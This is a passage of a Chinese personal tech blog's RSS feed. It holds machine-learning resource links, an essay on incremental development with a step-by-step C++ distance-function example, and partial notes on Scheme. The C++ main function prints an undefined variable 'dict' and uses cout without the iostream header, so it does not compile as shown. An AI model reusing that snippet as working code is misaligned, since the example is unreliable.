&lt;li&gt;&lt;a href="https://github.com/hangtwenty/dive-into-machine-learning"&gt;dive-into-machine-learning&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;a href="https://github.com/scikit-learn/scikit-learn"&gt;scikit-learn&lt;/a&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://python.jobbole.com/81721/"&gt;基于 Python 和 Scikit-Learn 的机器学习介绍&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://segmentfault.com/a/1190000002672062"&gt;机器学习探索之路1：机器学习相关工具介绍与安装&lt;/a&gt;:选择anaconda！&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/gmonce/scikit-learn-book"&gt;scikit-learn-book&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/justmarkham/scikit-learn-videos"&gt;scikit-learn-videos&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.xgezhang.com/scikit_learn_ml_translation.html"&gt;Scikit-Learn机器学习介绍（中文翻译）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://muxuezi.github.io/categories/scikit-learn-cookbook.html"&gt;Posts about scikit-learn cookbook&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;mooc&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.coursera.org/learn/machine-learning/"&gt;机器学习&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;资料集&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ty4z2008/Qix/blob/master/dl.md"&gt;机器学习(Machine Learning)&amp;amp;深度学习(Deep Learning)资料(Chapter 1)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/56256/"&gt;机器学习的最佳入门学习资源&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/73806/"&gt;国外程序员整理的机器学习资源大全&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;知乎问答&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/36768514/answer/81937823"&gt;有没有必要把机器学习算法自己实现一遍？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/22553761"&gt;如何简单形象又有趣地讲解神经网络是什么？&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;有趣的项目&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://fuzhii.com/2016/01/16/redmansions/"&gt;用机器学习的方法鉴别红楼梦作者&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/36853910"&gt;GitHub 上有哪些有趣的关于 NLP 或者 DL 的项目&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;图像相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/google/deepdream"&gt;deepdream&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jcjohnson/neural-style"&gt;neural-style&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/alexjc/neural-doodle"&gt;neural-doodle&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;高性能平台&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/tensorflow/tensorflow"&gt;tensorflow&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/aymericdamien/TensorFlow-Examples"&gt;TensorFlow-Examples&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tflearn/tflearn"&gt;tflearn&lt;/a&gt;:Deep learning library featuring a higher-level API for TensorFlow&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jtoy/awesome-tensorflow"&gt;awesome-tensorflow&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tensorflow/skflow"&gt;skflow&lt;/a&gt;:Simplified interface for TensorFlow (mimicking Scikit Learn) for Deep Learning&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Theano/Theano"&gt;Theano&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 16 Feb 2016 00:00:00 +0000</pubDate><guid>tag:,2016-02-16:machine-leanring-and-ai.html</guid><category>dev-tools</category></item><item><title>关于增量式开发</title><link>/about-incremental-development.html</link><description>&lt;p&gt;增量式开发是我最喜欢的开发方式之一。&lt;/p&gt;
&lt;h2&gt;1&lt;/h2&gt;
&lt;p&gt;在读《The Django Book》时，十分震惊,技术书籍居然可以写得这般清晰，清晰如阳光照射下，清水中的鹅软石。技术类书籍中好书是向来不缺的，对新手友好的书却也并不多见。《The Django Book》算是其一，后来我再翻这本书，想它为何能把知识说得这般清晰，发现书中讲解知识的方式是&lt;code&gt;增量式&lt;/code&gt;的：每次的讲解的内容都尽量做到只包含主题相关部分，基本不添加额外的知识干扰（打击）你，即便有些不可避免的后向引用，也会明确告诉你它的作用是啥，你目前只要把它当成黑盒就行。每一段程序都尽可能简易简短，每一节都在上一节基础上加上一点新东西，这样学起来真如读小说一般连贯有趣。如果哪里不懂，基本可以确定，不懂部分就是这节多出的知识。&lt;/p&gt;
&lt;h2&gt;2&lt;/h2&gt;
&lt;p&gt;《代码大全》里，在谈论隐喻部分时作者说道&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;增量设计 / 构造 / 测试是软件开发的最强有力工具之一&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在增量开发中，你首先设计系统可以运行的最简单版本。它甚至不接受任何数据输入，或者对数据进行处理，他也可以不产生输出。只需要成为一个坚实的骨架结构。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Fred Brooks(《人月神话》作者)甚至认为&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;应做好建造一个扔掉一个的准备&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;3&lt;/h2&gt;
&lt;p&gt;开源社区其实一直挺习惯这种做法的&lt;/p&gt;
&lt;p&gt;《大教堂与集市》中提到&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;优秀的程序员知道写什么，卓越的程序员知道改写（和重用）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;"建设性懒惰”，他们知道人们要的是结果而不是勤奋，而从一个部分可行的方案开始，明显要比从零开始容易得多&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;虽然Linux中所有Minix代码最终都被移除或重写，但它在Linux成长初期确实起到了类似脚手架的作用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上是我做的读书摘记。&lt;/p&gt;
&lt;p&gt;你看，以上谈论的几点，如果你平时都混迹github的话，也许就是这样做的，当有某个需求时，用关键字去github搜下是否有类似项目，有的话，clone下来，以其为脚手架，先跑起来，在此基础上增量地做些自己的定制，如果跑不起来，就checkout回去，成功的话，又继续往前多迈一步，因为使用的是增量式开发，你能知道每次的错误肯定是新增的代码造成的，这样一来你是信心十足的前进，毫无后顾之忧&lt;/p&gt;
&lt;h2&gt;4&lt;/h2&gt;
&lt;p&gt;晚上在翻《How to Think Like a Computer Scientist: C++ version》 （中文版《像计算机科学家一样思考 C++版》）&lt;/p&gt;
&lt;p&gt;第5章谈到程序开发时，作者建议大家使用增量式开发。书中举得一个例子很棒，摘录过来，适合帮助新手理解增量式开发的过程&lt;/p&gt;
&lt;p&gt;我们面临这样一个任务：计算两点（x1,y1）和（x2,y2）之间的距离&lt;/p&gt;
&lt;p&gt;公式是简单的：distance = √((x2-x1)^2+(y2-y1)^2)&lt;/p&gt;
&lt;h3&gt;4.1&lt;/h3&gt;
&lt;p&gt;好的，我们开始写下骨架代码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mf"&gt;0.0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在这一阶段函数并没有做任何实质性的事情，但是尝试编译可以让我们在把函数变得更复杂之前确认是否却在语法错误。&lt;/p&gt;
&lt;h3&gt;4.2&lt;/h3&gt;
&lt;p&gt;为了测试这个新函数，我们需要调用它&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dist&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;1.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;6.0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;dict&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;一旦检查完函数定义的语法，就可以开始一次添加一行的代码进行增量开发了。在每次增量改变之后，就可以编译运行程序，用这种方法，在任何一个时间点我们都确切知道错误所在--刚添加的最后一行代码。&lt;/p&gt;
&lt;h3&gt;4.3&lt;/h3&gt;
&lt;p&gt;编译，运行，一切正常。这时你的信心在不断累积。下一步是用两个临时变量dx和dy存储x2-x1和y2-y1的差值&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;dx is &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;dy is &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mf"&gt;0.0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在此计算distance(1.0, 2.0, 4.0, 6.0)。其中参数的选择是有原因的，水平距离为3，垂直距离为4，所以两点间距离为5，当测试一个函数的时候，知道正确的结果是很有帮助的。在这里dx为3.0，dy为4.0&lt;/p&gt;
&lt;p&gt;编写完函数时，会删除输出语句，像这样的代码称为&lt;code&gt;支架代码&lt;/code&gt;，可以帮助正确地编写程序，但是它并不是最终代码的一部分。&lt;/p&gt;
&lt;h3&gt;4.4&lt;/h3&gt;
&lt;p&gt;下一步是对dx和dy做平方计算，我们使用简单快捷的直接与自身相乘。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dsquared&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;dsquared is &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;dsquared&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mf"&gt;0.0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在这个阶段可以再一次编译和运行程序，检查中间值是否正确&lt;/p&gt;
&lt;h3&gt;4.5&lt;/h3&gt;
&lt;p&gt;最后，用sqrt函数计算平方根，并返回结果&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dsquared&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqrt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dsquared&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;至此，主要的工作就完成了。&lt;/p&gt;
&lt;h3&gt;4.6&lt;/h3&gt;
&lt;p&gt;在main函数中，检查结果&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;math.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dsquared&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqrt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dsquared&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dist&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;1.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;6.0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;dict&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;熟练之后，一次可以编写和调试更多的行。&lt;/p&gt;
&lt;p&gt;总结下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从一个可以运行的程序开始，做小步，渐进的改进。在任何一点，如果出错，可以清楚地知道错误发生的地方&lt;/li&gt;
&lt;li&gt;使用临时变量存储中间结果，便于输出和检查。&lt;/li&gt;
&lt;li&gt;一旦程序正常运行，可能需要移除部分支架代码。记得加上注释使程序保持可读性。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此外可以结合git来管理代码，将没有问题的代码入库，保证代码安全的同时，可以随时切换到任意时间点。这样在渐进前进的同时就可以无所顾忌了&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 04 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-04:about-incremental-development.html</guid><category>code</category></item><item><title>Scheme学习笔记</title><link>/learn-Scheme.html</link><description>&lt;p&gt;大学时读了不少函数式的资料，十分喜欢函数式的风格。&lt;br /&gt;
前段时间比较认真地学了一下Scheme。&lt;br /&gt;
尽管我们在实际项目中很少会用到Scheme，但学习Scheme有助于写出更高质量函数。就像学习Smalltalk有助于理解对象。&lt;br /&gt;
Scheme和Smalltalk是我见过最纯粹优美的两门语言。&lt;br /&gt;
说说学习Scheme中的一些心得体会：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;表达你的意图，而不是操作过程，这样有助于我们能站在更高的抽象层面上&lt;/li&gt;
&lt;li&gt;尽量不要副作用，函数主要目的是返回(return)一个值。这样可以保证函树能更容易被当作黑箱，就是说有更好的抽象性&lt;/li&gt;
&lt;li&gt;for-loops表达的是过程，map,reduce,filter(sorted,groupby)隐含循环，语义上却在表达意图&lt;/li&gt;
&lt;li&gt;表达出你的意图能提高代码可读性&lt;/li&gt;
&lt;li&gt;在自己的定义中调用自己的函数叫做递归函数. &lt;/li&gt;
&lt;li&gt;现实中很多任务是递归的，重复某个动作，符合条件退出。这是普适性很强的抽象模型&lt;/li&gt;
&lt;li&gt;以下内容有助于你理解递归：你可能需要去阅读你正在阅读的文献所引用的文献。进一步，你可能还需要去阅读文件所引用的其它文献。这样，文献调研就是一个递归的过程，你也可以重复这个调研过程直到满足了特定条件&lt;/li&gt;
&lt;li&gt;递归耗内存的原因是开销大的原因在于过程没有被计算。一直存在内存中。尾递归的本质是用某个内存空间来收集计算的结果，而不必一直存在内存中&lt;/li&gt;
&lt;li&gt;cons 负责把每个结果串起来。大脑的内存不很大，我们能应付的复杂度很有限。所以每次不要走太远，每次只处理当前一步，思考后续一致，用递归的方式思考。  使用抽象来描述，不要把所有过程加载到大脑&lt;/li&gt;
&lt;li&gt;命名递归变量很重要，表达出意图&lt;/li&gt;
&lt;li&gt;lambda表达式的参数仅在函数定义内部有效。let只是lambda的语法糖，因此二者无异。对于语义的表达有帮助的话，语法糖就是良好的&lt;/li&gt;
&lt;li&gt;lambda表达式用于定义函数，它为变量建立了一个作用域，变量的作用域被限定在了源码中定义其的那个括号里&lt;/li&gt;
&lt;li&gt;闭包能记住内部状态，因此可以用来模拟对象&lt;/li&gt;
&lt;li&gt;赋值改变了参数的值，具有破坏性，当万不得已时才使用赋值&lt;/li&gt;
&lt;li&gt;Scheme并没有定义块结构的语法，因此使用lambda表达式作为一个块&lt;/li&gt;
&lt;li&gt;高阶函数是一种以函数为参数的函数。它们都被用于映射（mapping）、过滤（filtering）、归档（folding）和排序（sorting）表。高阶函数提高了程序的模块性。使用一个高阶函数来实现排序可以使得我们使用不同的条件来排序，这就将排序条件和排序过程清楚地划分开来。很容易写函数来实现插拔。&lt;/li&gt;
&lt;li&gt;Scheme中代码即数据，因此你可以通过将函数当作参数传递轻松的定义自己的高阶函数。&lt;/li&gt;
&lt;li&gt;你可以通过“程序”来写程序&lt;/li&gt;
